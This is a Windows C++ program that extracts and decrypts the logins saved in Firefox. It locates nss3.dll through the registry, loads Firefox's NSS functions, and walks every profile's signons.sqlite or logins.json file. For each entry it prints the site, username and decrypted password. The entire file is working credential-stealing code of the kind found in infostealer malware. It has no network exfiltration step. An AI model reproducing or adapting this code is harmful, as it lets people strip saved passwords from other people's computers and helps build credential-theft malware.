#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <string>
#include <cstdio>
#include <conio.h>
#include <Wincrypt.h>
#include <fstream>
#include <json/json.h>
 
 
#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")
 
using namespace std;
 
 
#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0
#define SQLITE_OK 0
#define SQLITE_ROW 100
#define SQLITE_API
 
char g_ver[20];
 
 
typedef enum SECItemType {
    siBuffer = 0,
        siClearDataBuffer = 1,
        siCipherDataBuffer,
        siDERCertBuffer,
        siEncodedCertBuffer,
        siDERNameBuffer,
        siEncodedNameBuffer,
        siAsciiNameString,
        siAsciiString,
        siDEROID,
        siUnsignedInteger,
        siUTCTime,
        siGeneralizedTime
};
 
struct SECItem {
    SECItemType type;
    unsigned char *data;
    size_t len;
};
 
typedef enum SECStatus {
    SECWouldBlock = -2,
        SECFailure = -1,
        SECSuccess = 0
};
 
 
typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef SECStatus(*NSS_Init) (const char *);
typedef SECStatus(*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void(*PK11_FreeSlot) (PK11SlotInfo *);
typedef SECStatus(*PK11_Authenticate) (PK11SlotInfo *, PRBool, void *);
typedef SECStatus(*PK11SDR_Decrypt) (SECItem *, SECItem *, void *);
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int(SQLITE_API *fpSqliteOpen)(const char *, sqlite3 **);
typedef int(SQLITE_API *fpSqlitePrepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
typedef int(SQLITE_API *fpSqliteStep)(sqlite3_stmt *);
typedef const unsigned char *(SQLITE_API *fpSqliteColumnText)(sqlite3_stmt*, int);
 
PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11SDR_Decrypt         PK11SDRDecrypt;
NSS_Init                fpNSS_INIT;
NSS_Shutdown            fpNSS_Shutdown;
 
fpSqliteOpen isqlite3_open;
fpSqlitePrepare_v2 isqlite3_prepare_v2;
fpSqliteStep isqlite3_step;
fpSqliteColumnText isqlite3_column_text;
 
char *dupcat(const char *s1, ...){
    int len;
    char *p, *q, *sn;
    va_list ap;
     
    len = strlen(s1);
    va_start(ap, s1);
    while (1) {
        sn = va_arg(ap, char *);
        if (!sn)
            break;
        len += strlen(sn);
    }
    va_end(ap);
     
    p = new char[len + 1];
    strcpy(p, s1);
    q = p + strlen(p);
     
    va_start(ap, s1);
    while (1) {
        sn = va_arg(ap, char *);
        if (!sn)
            break;
        strcpy(q, sn);
        q += strlen(q);
    }
    va_end(ap);
     
    return p;
}
 
char *installPath(){
    DWORD cbSize;
    char value[MAX_PATH];
    char *path = "SOFTWARE\\Mozilla\\Mozilla Firefox";
     
    cbSize = MAX_PATH;
    if (!SHGetValue(/*HKEY_LOCAL_MACHINE*/HKEY_CURRENT_USER, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)){
        path = dupcat(path,"\\",value,"\\Main",0);
        strcpy(g_ver, value);
        printf("[+] Firefox version %s\n", g_ver);
        cbSize = MAX_PATH;
        if (!SHGetValue(/*HKEY_LOCAL_MACHINE*/HKEY_CURRENT_USER, path, "Install Directory", 0, value, &cbSize)){
            int size = strlen(value)+1;
            char *ret = (char *)calloc(size,1);
            memcpy(ret,value,size);
            delete[]path;
            return ret;
        }
    }
     
    return 0;
}
 
BOOL loadFunctions(char *installPath){
    if (installPath){
        char path[4096];
        DWORD dwError = GetEnvironmentVariable("PATH", path, 4096);
        char *newPath = path;
        newPath = dupcat(newPath,";",installPath,0);
         
        SetEnvironmentVariable("PATH", newPath);
        HMODULE hNSS = LoadLibrary((dupcat(installPath,"\\nss3.dll",0)));
        delete[]newPath;
         
        if (hNSS){
            fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
            fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
            PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
            PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
            PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
            PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
            isqlite3_open = (fpSqliteOpen)GetProcAddress(hNSS, "sqlite3_open");
            isqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(hNSS, "sqlite3_prepare_v2");
            isqlite3_step = (fpSqliteStep)GetProcAddress(hNSS, "sqlite3_step");
            isqlite3_column_text = (fpSqliteColumnText)GetProcAddress(hNSS, "sqlite3_column_text");
        }
        return !(!fpNSS_INIT || !fpNSS_Shutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot);
    }
    return FALSE;
}
 
char *Crack(const char *s){
    BYTE byteData[8096];
    DWORD dwLength = 8096;
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem in, out;
    char *result = "";
     
    ZeroMemory(byteData, sizeof (byteData));
     
    if (CryptStringToBinary(s, strlen(s),CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0)){
        slot = (*PK11GetInternalKeySlot) ();
        if (slot != NULL){
            status = PK11Authenticate(slot, PR_TRUE, NULL);
            if (status == SECSuccess){
                in.data = byteData;
                in.len = dwLength;
                out.data = 0;
                out.len = 0;
                status = (*PK11SDRDecrypt) (&in, &out, NULL);
                if (status == SECSuccess){
                    memcpy(byteData, out.data, out.len);
                    byteData[out.len] = 0;
                    result = ((char*)byteData);
                }
                else
                    result = "Error on decryption!";
            }
            else
                result = "Error on authenticate!";
            (*PK11FreeSlot) (slot);
        }
        else{
            result = "Get Internal Slot error!";
             
        }
    }
    return result;
}
 
void showDecryptedPasswords(){
    char path[MAX_PATH];
    char appData[MAX_PATH], profile[MAX_PATH];
    char sections[4096];
     
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
    _snprintf(path, sizeof(path),/* _TRUNCATE,*/ "%s\\Mozilla\\Firefox\\profiles.ini", appData);
    GetPrivateProfileSectionNames(sections, 4096, path);
    char *p = sections;
     
    while (1){
        if (_strnicmp(p, "Profile", 7) == 0) {
            GetPrivateProfileString(p, "Path", NULL, profile, MAX_PATH, path);
            _snprintf(path, sizeof(path),/* _TRUNCATE,*/"%s\\Mozilla\\Firefox\\Profiles\\%s", appData,std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());
             
            if (!(*fpNSS_INIT) (path)){
                if ( strstr( g_ver, "32") == NULL){
                    printf("[+] Using sqlite keep userinfo...\n");
 
                    char *database = dupcat(path,"\\signons.sqlite",0);
                    //
                    int intrari = 0;
                    sqlite3 *db;
                    if (isqlite3_open(database, &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        char *query = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
                        if (isqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
                            while (isqlite3_step(stmt) == SQLITE_ROW) {
                                char *user,*password,*site;
                                user = (char*)isqlite3_column_text(stmt, 0);
                                password = (char*)isqlite3_column_text(stmt, 1);
                                site = (char*)isqlite3_column_text(stmt, 2);
                                intrari++;
                                 
                                printf("Entry: %d\n",intrari);
                                printf("Site: %s\n",site);
                                printf("User: %s\n",Crack(user));
                                printf("Password: %s\n",Crack(password));
                            }
                            delete[]database;
                        }
                        else
                            printf("Can't prepare database!\n");
                    }
                    else
                        printf("Can't open database!\n");
                    if (intrari == 0)
                        printf("No entries found in %s\n", database);
                }
                else{
                    // logins.json
                    printf("[+] Using json keep userinfo.");
                    char *jsonfile = dupcat(path,"\\logins.json",0);
                    Json::Reader reader;
                    Json::Value root;
                     
                    ifstream ifs(jsonfile);
                    if (reader.parse(ifs, root))
                    {
                        string code;
                        if (!root["logins"].isNull())
                        {
                            int loginsNum = root["logins"].size();
                            Json::Value loginEntrys = root["logins"];
                            for (int i = 0; i < loginsNum; i++)
                            {
                                printf("Entry: %d\n", i);
                                printf("Site: %s\n",loginEntrys[i]["hostname"].asCString());
                                printf("User: %s\n",Crack(loginEntrys[i]["encryptedUsername"].asCString()));
                                printf("Password: %s\n",Crack(loginEntrys[i]["encryptedPassword"].asCString()));
                                 
                            }
                        }
                    }
                }
                (*fpNSS_Shutdown) ();
            }
            else
                printf("NSS_Init() error!\n");
        }
        p += lstrlen(p) + 1;
        if (p[0] == 0) break;
    }
}
 
void main(){
    char *path = installPath();
    if (loadFunctions(path)){
        //Lets see the credentials
        showDecryptedPasswords();
        free(path);
    }
    else
        printf("Can't find nss3.dll!\n");
    _getch();
}